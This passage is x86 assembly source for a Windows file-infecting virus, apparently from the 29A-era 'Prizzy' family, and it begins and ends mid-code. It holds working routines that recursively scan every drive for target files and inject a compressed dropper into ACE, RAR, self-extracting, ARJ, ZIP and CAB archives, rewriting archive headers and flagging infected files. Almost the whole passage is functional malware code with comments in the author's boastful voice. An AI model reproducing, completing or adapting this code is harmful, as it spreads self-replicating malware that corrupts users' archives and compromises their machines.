		;and many namez, find "HyperTable" struct  for	more info.
		;If you want to know more  about this method,  open "Hyper
		;Infection" article in 29A #4, or download one from my web
		;
		;Note:	* This is version for API, for IDT orientation use
		;	  code from "Win95.Prizzy", thanks.
		;
init_search:

		pusha
		call	get_base_ebp		;where we're into ebp

		mov	ebx,[ebp+search_table]	;position in HyperTable
		cmp	byte ptr [ebp+search_start],00h
		jnz	__continue
		mov	byte ptr [ebp+search_start],01h
		call	get_disks		;get drive parameters
		lea	eax,[ebp+time]
		push	eax
		call	[ebp+ddGetSystemTime]	;get actual time

		mov	eax,search_mem_size	;size of mem for searching
		call	malloc
		jz	init_search_error	;were we sucessful ?
		mov	[ebp+search_address],eax

		mov	eax,005C3A43h		;'C:\\0'
		mov	dword ptr [ebp+search_filename],eax
    __searching:
		mov	byte ptr [ebp+search_plunge],00h
		jmp	search_all_dirs
    __searching_end:
		cmp	byte ptr [ebp+search_filename],'Z'
		jz	init_search_done
		inc	byte ptr [ebp+search_filename]
		mov	word ptr [ebp+search_filename+2],005Ch

		; what disk is it ? fixed ? cd-rom ? ram-disk ? etc. ?
		mov	cl,'A'
		sub	cl,[ebp+search_filename]
		neg	cl
		mov	eax,00000001h
		shl	eax,cl			;convert to BCD
		test	[ebp+gdt_flags],eax
		jnz	__searching		;may I "use" this disk ?
		jmp	__searching_end 	;uaaaaah, i'm crazy... :)

init_search_exit:
		mov	ecx,dword ptr [ebp+search_address]
		call	mdealloc		;deallocate memory

init_search_error:
		popa				;restore all regz
		ret

init_search_done:				;all disks infected?
		call	hookHyperInfection_Done ;remove timer
		jmp	init_search_exit

search_all_dirs:
		lea	ebx,[ebp+HyperTable]
search_all_dirs_continue:
		call	__add_filename		;add filename or extension

		call	__calc_in_mem		;offs dta in mem to esi

		lea	edx,[ebp+search_filename]
		call	__MyFindFirst
		mov	[esi-size search_handle],eax	;save handle
		jc	__find_dir		;error ?

	__repeat:
		call	__clean 		;delete extension
		push	esi
		lea	esi,[esi].dta_filename	;and add file name
		@copysz 			;copy with zero char
		pop	esi			;restore esi=dta in memory
		lea	eax,[ebp+search_filename]
		mov	[ebp+filename_ptr],eax

	__final_SoftICE_1:
		nop
		nop
;		 int	 4			 ;final SoftICE breakpoint

		mov	eax,[ebx-00000004h]	;input value
		push	dword ptr [ebx-00000008h]
		add	[esp],ebp		;this was ghastly bug !
		call	[esp]			;call function
		pop	eax

		push	word ptr [ebp+time.wSecond]
		lea	eax,[ebp+time]		;give time other appz
		push	eax
		call	[ebp+ddGetSystemTime]
		pop	cx
		mov	[ebp+search_table],ebx	;position in HyperTable
		cmp	cx,[ebp+time.wSecond]	;out of time ?
		jnz	init_search_error

	__continue:
		call	__calc_in_mem		;esi=dta in memory
		mov	eax,[esi-size search_handle]	;handle of FindFirstFile
		call	__MyFindNext
		jnc	__repeat
		call	__MyFindClose

     __find_dir:
		call	__clean 		;remove file name/extension
		cmp	byte ptr [ebx],0FFh	;last file name ?
		jnz	search_all_dirs_continue

     __find_dir_continue:
		mov	[edi],002A2E2Ah 	;add '*.*',0

		call	__calc_in_mem
		lea	edx,[ebp+search_filename]

		call	__MyFindFirst		;search directory "only"
		mov	[esi-size search_handle],eax
		jc	__search_exit

 __find_in_dir:
		test	[esi].dta_fileattr,10h	;is it directory ?
		jz	__find_next
		cmp	[esi].dta_filename,'.'	;it can't be directory
		jz	__find_next

		inc	byte ptr [ebp+search_plunge]

		call	__get_last_char 	;edi=last char of filename
		lea	esi,[esi].dta_filename	;esi=filename

		call	__clean 		;remove extension

		@copysz 			;copy directory name and
		mov	word ptr [edi-1],005Ch	;set '\' at the end

		jmp	search_all_dirs 	;search in new directory

    __find_next:
		call	__calc_in_mem
		mov	eax,[esi-size search_handle]
		call	__MyFindNext
		jnc	__find_in_dir

  __search_exit:
		call	__clean 		;remove file name and '\'
		mov	byte ptr [edi-1],00h	;it's out of directory
		dec	byte ptr [ebp+search_plunge]
		cmp	byte ptr [ebp+search_filename+2],00h
		jz	__searching_end
		jmp	__find_next

  __calc_in_mem:				;get pointer to dta in memory
		movzx	esi,byte ptr [ebp+search_plunge]
		imul	esi,size dta+size search_handle
		add	esi,[ebp+search_address]
		add	esi,size search_handle
		ret

 __add_filename:				;add f.n. or ext by HyperTable
		call	__get_last_char
		cmp	byte ptr [ebx],00h	;only extension ?
		jnz	__af_fullcopy
		mov	eax,[ebx+1]		;load extension
		mov	byte ptr [edi],2Ah	;'*'
		mov	[edi+1],eax		;and extension
		mov	byte ptr [edi+5],00h	;zero byte
		add	ebx,HyperTable_OneSize
		cmp	byte ptr [ebx - \
			HyperTable_HalfSize],00h;search this extension ?
		jz	__aff_finish
		pop	eax
		jmp	__find_dir
	__aff_finish:
		ret

	__af_fullcopy:
		inc	ebx
		mov	al,byte ptr [ebx]	;load filename's char
		mov	[edi],al
		inc	edi
		or	al,al			;end of filename ?
		jnz	__af_fullcopy
		add	ebx,HyperTable_HalfSize+1;+1 means zero byte
		cmp	byte ptr [ebx - \
			HyperTable_HalfSize],00h;search this filename ?
		jz	__aff_finish
		pop	eax
		jmp	__find_dir

__get_last_char:				;edi=last char+1 in filename
		lea	edi,[ebp+search_filename]
		mov	ecx,filename_size
		xor	al,al
		cld
		repnz	scasb
		dec	edi
		ret

	__clean:				;clean last item in filename
		lea	edx,[ebp+search_filename]
		call	__get_last_char
	    __2:mov	byte ptr [edi],0
		dec	edi
		cmp	byte ptr [edi],'\'
		jnz	__2
		inc	edi
		ret

;ÄÄÄ´ infection in ACE/RAR and ACE/RAR EXE-SFX archivez ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

		;---------------------------------------------------------
		;This function scans input EXE	file whether it is not SFX
		;for RAR (Dos,W32) or for ACE (Dos,Win32 - German/English)
		;If yes, I will put compressed dropper in the end of file.
		;Why that ? See on "infect_ACE:" comment for more info.
		;
		__iSFX_fHandle	dd	00000000h	;file's handle
		__iSFX_fMemory	dd	00000000h	;file's headers
		__iSFX_nCompare dd	00000000h	;comparing places
		;
infect_ACE_RAR:

		; open input file
		mov	edx,[ebp+filename_ptr]
		call	__MyOpenFile
		jc	__iSFX_finish
		mov	[ebp+__iSFX_fHandle],eax

		; allocate memory for comparing
		mov	eax,10000h
		call	malloc
		mov	[ebp+__iSFX_fMemory],eax

		; we must search certain bytes on certain file position
		mov	[ebp+__iSFX_nCompare],7 	;six! comparing
	__iSFX_search_1:
		dec	[ebp+__iSFX_nCompare]
		jz	__iSFX_sEnd
		lea	ebx,[ebp+Archive_MagicWhere]
	__iSFX_magic_okay:
		mov	eax,[ebp+__iSFX_nCompare]
		imul	eax,00000004h
		add	ebx,eax
		movzx	ecx,word ptr [ebx-0002h]	;ecx=bytes to read
		movzx	esi,word ptr [ebx-0004h]	;esi=file pos

		; now, i will read datas
		mov	edx,[ebp+__iSFX_fMemory]	;allocated place
		mov	ebx,[ebp+__iSFX_fHandle]
		call	__MyReadFile			;i can't check error!

		; prepare to scan
		mov	edi,[ebp+__iSFX_fMemory]
		mov	ebx,edi
		add	ebx,ecx 		;end of memory buffer
	__iSFX_search_2:
		cmp	edi,ebx
		ja	__iSFX_search_1

		; search archive's signatures
		lea	esi,[ebp+RAR_Magic]		;no, esi=RAR_Magic
		mov	ecx,RAR_Magic_Length		;and its size
		cmp	[ebp+__iSFX_nCompare],00000004h
		jae	__iSFX_s2_continue		;is it really RAR ?
		lea	esi,[ebp+ACE_Magic]		;esi=ACE_Magic
		mov	ecx,ACE_Magic_Length		;and its size
	__iSFX_s2_continue:
		cld
		rep	cmpsb			;compare magics
		jnz	__iSFX_search_2 	;shit, we must search on other place

		; position on header's start
		sub	edi,RAR_Magic_Length
		cmp	[ebp+__iSFX_nCompare],00000004h
		jae	__iSFX_h_read
		sub	edi,2*ACE_Magic_Length-RAR_Magic_Length
	__iSFX_h_read:

		; check multivolume flag
		cmp	[ebp+__iSFX_nCompare],00000004h
		jae	__iSFX_mf_rar
		test	word ptr [edi+ACEhHeadFlags-ACE_h_struct],2048
		jmp	__iSFX_mf_finish
	__iSFX_mf_rar:
		test	word ptr [edi+RARFileFlags-RARSignature],0001h
	__iSFX_mf_finish:
		jnz	__iSFX_sEnd

		; call "child" functions, set certain input parameters
		mov	eax,[ebp+__iSFX_fHandle]
		mov	[ebp+__iACR_fHandle],eax	;modify handle

		mov	[ebp+__iACR_Type],__iACR_tRAR	;yeah, RAR archive
		cmp	[ebp+__iSFX_nCompare],00000004h
		jae	__iSFX_cc_finish
		mov	[ebp+__iACR_Type],__iACR_tACE	;yeah, ACE archive
	__iSFX_cc_finish:
		mov	ebx,[ebp+__iSFX_fHandle]	;check whether SFX
		call	__get_archive_infected		;archive has been
		jc	__iSFX_fClose			;infected

		call	__iACR_child_function		;call main function
		jmp	__iSFX_finish			;to infect ACE or RAR

	__iSFX_sEnd:
		call	__iSFX_fClose
		stc
		ret

	__iSFX_fClose:
		mov	ebx,[ebp+__iSFX_fHandle]
		call	__MyCloseFile
	__iSFX_finish:
		clc
		ret

;ÄÄÄ´ infection in ACE, RAR archivez ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

		;---------------------------------------------------------
		;This function infects ACE and RAR archivez. Unfortunately
		;I can't my dropper place inside archive 'cause if archive
		;is solid type resulting archive won't okay. Yes, this was
		;shock for me. But if archive isn't solid all will be okay
		;althrough this method is not support here. So, my dropper
		;is compressed but in the end of file.
		;
		;  input:    filename_ptr ... pointer to an ARJ's filename
		;	     NewARJ struc ... has been filled? I dont know!
		;
		;  output:   nothing
		;
		__iACR_fHandle	dd	00000000h	;archive's handle
		__iACR_dHandle	dd	00000000h	;dropper's handle
		__iACR_dMemory	dd	00000000h	;dropper's body
		;
		__iACR_Type	dd	00000000h	;ACE or RAR ?
		__iACR_tACE	equ	00h		;ACE signature
		__iACR_tRAR	equ	01h		;RAR signature
		;
infect_ACE:	mov	[ebp+__iACR_Type],__iACR_tACE	;yeah, ACE archive
		jmp	infect_ACR
infect_RAR:	mov	[ebp+__iACR_Type],__iACR_tRAR	;yeah, RAR archive

		; here, common functions is starting...
infect_ACR:

		; check whether dropper exists
		mov	eax,[ebp+__iACR_Type]	;get archive type
		imul	eax,size AProgram
		cmp	[ebp+eax+NewACE.dropper],00000000h
		jz	__iACR_finish		;does dropper exists ?

		; open archive file
		mov	edx,[ebp+filename_ptr]
		call	__MyOpenFile
		jc	__iACR_finish
		mov	[ebp+__iACR_fHandle],eax

		; check whether archive has been infected
		mov	ebx,[ebp+__iACR_fHandle]
		call	__get_archive_infected
		jc	__iACR_fClose

		; read archive header
	    cmp     dword ptr [ebp+offset __iACR_Type],__iACR_tACE
	    jnz     __iACR_rar_1
		lea	edx,[ebp+ACE_h_struct]	;destination place
		mov	ecx,ACENeededBytes
		jmp	__iACR_end_1
	__iACR_rar_1:
		lea	edx,[ebp+RARSignature]	;destination place
		mov	ecx,RARSignature_Length + \
			    RARNeededBytes	;number of bytes to read

	__iACR_end_1:
		xor	esi,esi
		mov	ebx,[ebp+__iACR_fHandle]
		call	__MyReadFile
		jc	__iACR_fClose

		; check archive's header
	    cmp     dword ptr [ebp+offset __iACR_Type],__iACR_tACE
	    jnz     __iACR_rar_2
		cmp	dword ptr [ebp+ACEhSignature],'CA**'
		jnz	__iACR_fClose		;the 1st part of sign
		cmp	word ptr [ebp+ACEhSignature+00000004h],'*E'
		jnz	__iACR_fClose		;the 2nd part
		test	word ptr [ebp+ACEhHeadFlags],2048
		jnz	__iACR_fClose		;multivolume flag ?
		jmp	__iACR_end_2
	__iACR_rar_2:
		cmp	dword ptr [ebp+RARSignature],'!raR'
		jnz	__iACR_fClose
		cmp	word ptr [ebp+RARSignature+00000004h],071Ah
		jnz	__iACR_fClose
		test	word ptr [ebp+RARFileFlags],0001h
		jnz	__iACR_fClose		;multivolume flag ?
	__iACR_end_2:

		; open dropper file
	__iACR_child_function:
		mov	edx,[ebp+__iACR_Type]	;get archive type
		imul	edx,size AProgram
		mov	edx,[ebp+edx+NewACE.dropper]
		or	edx,edx 		;once again test:
		jz	__iACR_finish		;does dropper exists ?
		call	__MyOpenFile
		jc	__iACR_fClose
		mov	[ebp+__iACR_dHandle],eax

		; get dropper's file size
		mov	ebx,[ebp+__iACR_dHandle]
		call	__MyGetFileSize
		mov	ecx,eax

		; allocate memory for dropper's file body
		call	malloc
		mov	[ebp+__iACR_dMemory],eax

		; read whole dropper's body
		mov	edx,[ebp+__iACR_dMemory];destination buffer
		xor	esi,esi 		;file position
		mov	ebx,[ebp+__iACR_dHandle];dropper's handle
		call	__MyReadFile
		jc	__iACR_dClose

		; get archive file size
		mov	ebx,[ebp+__iACR_fHandle]
		call	__MyGetFileSize
		mov	esi,eax

		; "update" archive file by my dropper
	    cmp     dword ptr [ebp+offset __iACR_Type],__iACR_tACE
	    jnz     __iACR_rar_3
		movzx	eax,word ptr [edx+ACEhHeadSize-ACE_h_struct]
		add	eax,00000004h
		jmp	__iACR_end_3
	__iACR_rar_3:
		movzx	eax,word ptr [edx+RARHeaderSize-RARSignature]
		add	eax,RARSignature_Length

	__iACR_end_3:
		add	edx,eax 		;header take away
		sub	ecx,eax 		;without main header, please
		mov	ebx,[ebp+__iACR_fHandle]
		call	__MyWriteFile		;write my dropper, uaaah :)

		; archive has been infected
		mov	ebx,[ebp+__iACR_fHandle]
		call	__set_archive_infected

	__iACR_dClose:
		mov	ebx,[ebp+__iACR_dHandle]
		call	__MyCloseFile
	__iACR_dealloc:
		mov	eax,[ebp+__iACR_dMemory]
		call	mdealloc
	__iACR_fClose:
		mov	ebx,[ebp+__iACR_fHandle]
		call	__MyCloseFile

	__iACR_finish:
		ret

;ÄÄÄ´ infection in ARJ archivez ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

		;---------------------------------------------------------
		;This function infect ARJ archivez by my prepared dropper.
		;Dropper is compressed by ARJ (four method without store).
		;
		;  input:    filename_ptr ... pointer to an ARJ's filename
		;	     NewARJ struc ... 's been filled? I dont know!
		;
		;  output:   nothing
		;
		__iARJ_fHandle	dd	00000000h	;archive's handle
		__iARJ_fFiles	dd	00000000h	;number of files
		__iARJ_dHandle	dd	00000000h	;dropper's handle
		__iARJ_dMemory	dd	00000000h	;dropper's file body
		;
infect_ARJ:

		xor	eax,eax
		mov	[ebp+__iARJ_fFiles],eax

		; check whether dropper exists
		cmp	[ebp+NewARJ.dropper],00000000h
		jz	__iARJ_finish

		; open archive
		mov	edx,[ebp+filename_ptr]
		call	__MyOpenFile
		jc	__iARJ_finish
		mov	[ebp+__iARJ_fHandle],eax

		; check whether archive has been infected
		mov	ebx,[ebp+__iARJ_fHandle]
		call	__get_archive_infected
		jc	__iARJ_fClose

		; read archive header
		lea	edx,[ebp+ARJ_struct]	;destination place
		mov	ecx,ARJNeededBytes	;needed bytes to read
		xor	esi,esi 		;file position
		mov	ebx,[ebp+__iARJ_fHandle];file handle
		call	__MyReadFile
		jc	__iARJ_fClose

		; check archive's signatures
		cmp	word ptr [ebp+ARJHeaderId],0EA60h
		jnz	__iARJ_fClose
		test	byte ptr [ebp+ARJFlags],04h
		jnz	__iARJ_fClose		;multivolume flags, I guess

		; get number of files
		lea	edx,[ebp+ARJ_struct]	;destination place
		movzx	esi,word ptr [ebp+ARJHeaderSize] ;file position
		add	esi,0000000Ah		;add up file-off
		mov	ecx,ARJNeededBytes	;needed bytes to read
		mov	ebx,[ebp+__iARJ_fHandle];file handle
		push	esi			;first entry
	__iARJ_search_1:
		call	__iARJ_next_file
		jc	__iARJ_sEnd_1		;it isn't 100% error !

		; next file has been found
		inc	[ebp+__iARJ_fFiles]	;increase files counter :)
		jmp	__iARJ_search_1

	__iARJ_sEnd_1:
		pop	esi			;first entry
		cmp	ecx,00000004h		;end of file ?
		jnz	__iARJ_fClose
		cmp	word ptr [ebp+ARJHeaderSize],0000h
		jnz	__iARJ_fClose		;double security :)

		; generate my new archive file position
		mov	eax,[ebp+__iARJ_fFiles] ;number of files
		inc	eax
		call	ppe_get_rnd_range
		xchg	eax,ecx 		;new ECX: disable files

		; read file headers which aren't neccessary for me
		jecxz	__iARJ_sEnd_2
	__iARJ_search_2:
		push	ecx
		call	__iARJ_next_file	;disable folders
		pop	ecx
		loop	__iARJ_search_2
	__iARJ_sEnd_2:

		; note: ESI = my new place :)
		mov	edi,esi

		; open dropper file
		mov	edx,[ebp+NewARJ.dropper]
		call	__MyOpenFile
		jc	__iARJ_fClose
		mov	[ebp+__iARJ_dHandle],eax

		; get dropper's file size
		mov	ebx,[ebp+__iARJ_dHandle]
		call	__MyGetFileSize
		mov	edx,eax

		; get archive's file size and subtract my new place
		mov	ebx,[ebp+__iARJ_fHandle]
		call	__MyGetFileSize
		sub	eax,esi 		;esi = my new place
		push	eax			;archive's needed size
		add	eax,edx
		push	edx			;dropper's file size

		; allocate memory for dropper's file body
		call	malloc
		mov	[ebp+__iARJ_dMemory],eax

		; read whole dropper's file body
		mov	edx,[ebp+__iARJ_dMemory];destination place
		pop	ecx			;number of bytes to read
		xor	esi,esi 		;file position
		mov	ebx,[ebp+__iARJ_dHandle];file handle
		call	__MyReadFile
		pop	ebx			;archive's needed file size
		jc	__iARJ_dClose

		; read "almost" whole archive file behind my dropper
		add	edx,ecx 		;new destination place
		sub	edx,00000004h		;delete ending two flags
		mov	esi,edi 		;edi = my new place
		mov	ecx,ebx 		;number of bytes to read
		mov	ebx,[ebp+__iARJ_fHandle]
		call	__MyReadFile
		jc	__iARJ_dClose

		; "update" archive file :)
		add	ecx,edx 		;end of readed datas
		sub	ecx,[ebp+__iARJ_dMemory]
		mov	edx,[ebp+__iARJ_dMemory]
		movzx	eax,word ptr [edx+00000002h]
		add	eax,0000000Ah
		add	edx,eax
		sub	ecx,eax
		mov	ebx,[ebp+__iARJ_fHandle]
		call	__MyWriteFile

		; archive has been infected
		mov	ebx,[ebp+__iARJ_fHandle]
		call	__set_archive_infected

	__iARJ_dClose:
		mov	ebx,[ebp+__iARJ_dHandle]
		call	__MyCloseFile
	__iARJ_dealloc:
		mov	eax,[ebp+__iARJ_dMemory]
		call	mdealloc
	__iARJ_fClose:
		mov	ebx,[ebp+__iARJ_fHandle]
		call	__MyCloseFile

	__iARJ_finish:
		ret

		;---------------------------------------------------------
		;Set file position on the next entry
		;
		;   input:   EDX ... destination buffer
		;	     EBX ... file handle
		;	     ESI ... some header's place (file position)
		;
		;   output:  ESI ... next header position (if exists :)
		;	     Cflags
		;
	__iARJ_next_file:
		mov	ecx,ARJNeededBytes	;number of bytes to read
		call	__MyReadFile
		jc	__iARJ_nf_check 	;it isn't 100% error !

		; set file position on the next file
		movzx	eax,word ptr [ebp+ARJHeaderSize]
		add	eax,[ebp+ARJCompressedSize]
		add	eax,0000000Ah		;add up file-off
		add	esi,eax
	__iARJ_nf_check:
		ret

;ÄÄÄ´ infection in ZIP archivez ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

		;---------------------------------------------------------
		;This function adds to ZIP archive  certain EXE file which
		;has been infected and compressed by PKZIP achiver program
		;Compressing method  has been selected randomly  from four
		;possibilities (without "store" method, of course).
		;
		;  input:    filename_ptr ... pointer to a ZIP's filename
		;	     NewZIP struc ... has been filled? I dont know!
		;
		;  output:   nothing
		;
		__iZIP_fHandle	dd	00000000h	;archive's file handle
		__iZIP_fHeaders dd	00000000h	;archive's headers
		__iZIP_fNewDPos dd	00000000h	;a. pos for d. body
		__iZIP_fMemory	dd	00000000h	;archive's file body

		__iZIP_dHandle	dd	00000000h	;dropper's file handle
		__iZIP_dFSize	dd	00000000h	;dropper's file size
		__iZIP_dMemory	dd	00000000h	;dropper's file body
		__iZIP_dHSize	dd	00000000h	;dropper's header s.
		;
infect_ZIP:

		; check whether "NewZIP" struc has been filled
		cmp	[ebp+NewZIP.dropper],00000000h
		jz	__iZIP_finish

		; open archive file
		mov	edx,[ebp+filename_ptr]
		call	__MyOpenFile
		jc	__iZIP_finish
		mov	[ebp+__iZIP_fHandle],eax

		; check whether archive has been infected
		mov	ebx,[ebp+__iZIP_fHandle]
		call	__get_archive_infected
		jc	__iZIP_fClose

		; get archive file size
		mov	ebx,[ebp+__iZIP_fHandle]
		call	__MyGetFileSize
		mov	esi,eax

		; read its 3rd table
		mov	ecx,ZIPEHeaderSize	;number of bytes to read
		lea	edx,[ebp+ZIPReadBuffer] ;destination buffer
		sub	esi,ZIPEHeaderSize	;file pos
		mov	ebx,[ebp+__iZIP_fHandle];file handle
		call	__MyReadFile
		jc	__iZIP_fClose

		; check that table
		cmp	word ptr [ebp+ZIPEHeaderId],'KP'
		jnz	__iZIP_fClose
		cmp	word ptr [ebp+ZIPSignature],0605h
		jnz	__iZIP_fClose
		cmp	dword ptr [ebp+ZIPNoDisk],00000000h
		jnz	__iZIP_fClose

		; open dropper file
		mov	edx,[ebp+NewZIP.dropper]
		call	__MyOpenFile
		jc	__iZIP_fClose
		mov	[ebp+__iZIP_dHandle],eax

		; get its file size
		mov	ebx,[ebp+__iZIP_dHandle]
		call	__MyGetFileSize
		mov	[ebp+__iZIP_dFSize],eax

		; allocate memory
		call	malloc
		mov	[ebp+__iZIP_dMemory],eax

		; read its file body
		mov	ecx,[ebp+__iZIP_dFSize] ;number of bytes to read
		mov	edx,[ebp+__iZIP_dMemory];destination buffer
		xor	esi,esi 		;file pos
		mov	ebx,[ebp+__iZIP_dHandle]
		call	__MyReadFile

		; get dropper's start of header and its length
		mov	esi,[ebp+__iZIP_dMemory]
		add	esi,[ebp+__iZIP_dFSize]
		mov	ecx,[esi-0000000Ah]	;length of 2nd header
		sub	esi,ZIPEHeaderSize	;esi = header
		sub	esi,ecx
		mov	[ebp+__iZIP_dHSize],ecx
		push	esi

		; allocate memory for archive header + new header
		mov	eax,[ebp+ZIPSizeDir]
		add	eax,ecx
		call	malloc
		mov	[ebp+__iZIP_fHeaders],eax

		; read them to the buffer
		mov	ecx,[ebp+ZIPSizeDir]	;number of bytes to read
		add	ecx,ZIPEHeaderSize	;include 3rd table as well
		mov	edx,eax 		;destination place
		mov	esi,[ebp+ZIPOffsetDir]	;file pos
		mov	ebx,[ebp+__iZIP_fHandle]
		call	__MyReadFile
		jc	__iZIP_dealloc

		; get actual files in archive
		movzx	ecx,word ptr [ebp+ZIPEntrysDir]

		; and select my new position :)
		lea	eax,[ecx+00000001h]
		call	ppe_get_rnd_range
		sub	ecx,eax
		push	ecx
		xchg	eax,ecx

		; get my future offset if I'll be in the end
		mov	eax,[ebp+ZIPOffsetDir]
		not	eax
		mov	[ebp+__iZIP_fNewDPos],eax

		; seek on my new position in the headers
		mov	esi,[ebp+__iZIP_fHeaders]
	__iZIP_search_1:
		jecxz	__iZIP_sEnd_1
		add	esi,ZIPRScanSize1	;seek on FileNameSize
		movzx	eax,word ptr [esi]	; + filename length
		add	ax,word ptr [esi+2]	; + extra field
		add	esi,eax
		add	esi,ZIPRScanSize2	;seek on text file folder
		loop	__iZIP_search_1
	__iZIP_sEnd_1:

		pop	ecx			;how many folders change ?
		push	esi			;my new place for header
	__iZIP_search_2:
		jecxz	__iZIP_sEnd_2
		add	esi,ZIPRScanSize1 + \
			    ZIPRScanSize3
		test	dword ptr [ebp+__iZIP_fNewDPos],0F0000000h
		jz	__iZIP_search_2_next
		mov	eax,[esi]
		mov	[ebp+__iZIP_fNewDPos],eax
	__iZIP_search_2_next:
		mov	eax,[ebp+__iZIP_dFSize] ;== fbody+2nd+3rd table
		sub	eax,ZIPEHeaderSize	;== - 3rd table
		sub	eax,[ebp+__iZIP_dHSize] ;== - dropper's header size
		add	[esi],eax
		add	esi,[esi-ZIPRScanSize3] ;add FileNameSize
		add	esi,00000004h
		loop	__iZIP_search_2
	__iZIP_sEnd_2:

		; get number of bytes to move
		mov	ecx,esi
		pop	esi			;my new place
		sub	ecx,esi 		;number of bytes to move
		add	ecx,ZIPEHeaderSize	;include last table as well
		mov	edi,esi 		;"almost" destination
		add	edi,[ebp+__iZIP_dHSize] ;dropper's header length
		push	esi
		call	__movsd_back
		pop	edi

		; copy my new table, it means: "update header", please :)
		mov	ecx,[ebp+__iZIP_dHSize]
		pop	esi			;start of dropper's header
		push	edi
		rep	movsb
		pop	edi

		; change this copied header
		add	edi,ZIPRScanSize1 + ZIPRScanSize3
		mov	eax,[ebp+__iZIP_fNewDPos]
		test	eax,0F0000000h		;only if it is last "section"
		jz	$+4
		not	eax
		mov	[ebp+__iZIP_fNewDPos],eax
		mov	[edi],eax		;start of data
		mov	ecx,eax

		; allocate memory for archive body
		mov	ebx,[ebp+__iZIP_fHandle]
		call	__MyGetFileSize
		sub	eax,ecx 		;sub start of data
		mov	edx,eax
		add	eax,[ebp+__iZIP_dFSize]
		sub	eax,[ebp+__iZIP_dHSize] ;dropper's header length
		sub	eax,ZIPEHeaderSize	;3rd tablee
		call	malloc
		mov	[ebp+__iZIP_fMemory],eax

		; read part of archive file to the memory
		mov	esi,ecx 		;file position
		mov	ecx,edx 		;number of bytes to read
		mov	edx,[ebp+__iZIP_dHSize] ;dropper's header length
		neg	edx			;this was fucking bug !
		add	edx,[ebp+__iZIP_dFSize]
		sub	edx,ZIPEHeaderSize	;i don't want 3rd table
		mov	edi,edx 		;dropper's compressed body
		add	edx,[ebp+__iZIP_fMemory];destination place
		mov	ebx,[ebp+__iZIP_fHandle]
		call	__MyReadFile
		jc	__iZIP_dealloc

		; copy my compressed dropper before reader data
		mov	edx,ecx
		mov	ecx,edi 		;dropper's compressed body s.
		mov	ebx,ecx
		mov	esi,[ebp+__iZIP_dMemory]
		mov	edi,[ebp+__iZIP_fMemory]
		rep	movsb			;"update" archive :)

		; copy my changed headers behind compressed datas
		add	edi,edx 		;in the end of file
		sub	edi,[edi-0000000Ah]	;length of the 2nd table
		sub	edi,ZIPEHeaderSize	; - 3rd table
		mov	esi,[ebp+__iZIP_fHeaders]
	__iZIP_replace:
		cmp	[esi],06054B50h 	;'PK',05,06 ? Last table ?
		jz	__iZIP_replace_finish
		lodsb
		stosb
		jmp	__iZIP_replace
	__iZIP_replace_finish:
		mov	ecx,ZIPEHeaderSize	;copy last table
		rep	movsb

		; change last table
		add	[edi-00000006h],ebx	;archive size + dropper body
		mov	ecx,[ebp+__iZIP_dHSize] ;dropper's header length
		add	[edi-0000000Ah],ecx	;change ZIPSizeDir
		inc	word ptr [edi-0000000Eh];increase ZIPEntryDisk
		inc	word ptr [edi-0000000Ch];increase ZIPEntryDir

		; "update" archive file body
		mov	edx,[ebp+__iZIP_fMemory]
		mov	ecx,edi
		sub	ecx,edx
		mov	esi,[ebp+__iZIP_fNewDPos]
		mov	ebx,[ebp+__iZIP_fHandle]
		call	__MyWriteFile

		; archive has been infected
		mov	ebx,[ebp+__iZIP_fHandle]
		call	__set_archive_infected

	__iZIP_dealloc:
		mov	eax,[ebp+__iZIP_fMemory]
		call	mdealloc
		mov	eax,[ebp+__iZIP_fHeaders]
		call	mdealloc
		mov	eax,[ebp+__iZIP_dMemory]
		call	mdealloc

		mov	ebx,[ebp+__iZIP_dHandle]
		call	__MyCloseFile

	__iZIP_fClose:
		mov	ebx,[ebp+__iZIP_fHandle]
		call	__MyCloseFile

	__iZIP_finish:
		ret

;ÄÄÄ´ infection in CAB archivez ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

		;---------------------------------------------------------
		;This function infects Microsoft CAB archivez. The way	of
		;infection is the most difficult of all archivez here.Why?
		;Micro$hit CAB format is too stupid, I cannot compress	my
		;dropper because I don't know  any DLL which support this.
		;Although Windows has some Extrac32 and so on. If you want
		;to know more about CAB infection, download my tutorial on
		;web: http://prizzy.cjb.net (download section, of course).
		;
		;  input:    filename_ptr ... pointer to a CAB's file
		;	     NewCAB.dropper . name of EXE
		;
		__iCAB_fHandle	dd	00000000h	;archive's handle
		__iCAB_fFSize	dd	00000000h	;archive's file size
		__iCAB_fMemory	dd	00000000h	;archive's body+hdrs

		__iCAB_dHandle	dd	00000000h	;dropper's handle
		__iCAB_dFSize	dd	00000000h	;dropper's file size

		__iCAB_nChars	dd	00000000h	;chars of new name
		__iCAB_myFolder dd	00000000h	;my new folder
		;
infect_CAB:

		; check whether dropper exists
		cmp	[ebp+NewCAB.dropper],00000000h
		jz	__iCAB_finish

		; open archive file
		mov	edx,[ebp+filename_ptr]
		call	__MyOpenFile
		jc	__iCAB_finish
		mov	[ebp+__iCAB_fHandle],eax

		; check whether archive has been infected
		mov	ebx,[ebp+__iCAB_fHandle]
		call	__get_archive_infected
		jc	__iCAB_fClose

		; get archive file size
		mov	ebx,[ebp+__iCAB_fHandle]
		call	__MyGetFileSize
		mov	[ebp+__iCAB_fFSize],eax

		; open dropper file
		mov	edx,[ebp+NewCAB.dropper]
		call	__MyOpenFile
		jc	__iCAB_fClose
		mov	[ebp+__iCAB_dHandle],eax

		; get dropper's file size
		mov	ebx,[ebp+__iCAB_dHandle]
		call	__MyGetFileSize
		mov	[ebp+__iCAB_dFSize],eax

		; generate dropper's name
		lea	edi,[ebp+CABf_FileName]
		call	generate_name
		mov	[ebp+__iCAB_nChars],eax

		; allocate memory for whole file
		mov	eax,[ebp+__iCAB_fFSize]
		add	eax,[ebp+__iCAB_dFSize]
		add	eax,(CABe_Compr_data - CAB_directory_start) - (8+1+3)
		add	eax,[ebp+__iCAB_nChars]
		call	malloc
		mov	[ebp+__iCAB_fMemory],eax

		; read archive's headers to buffer
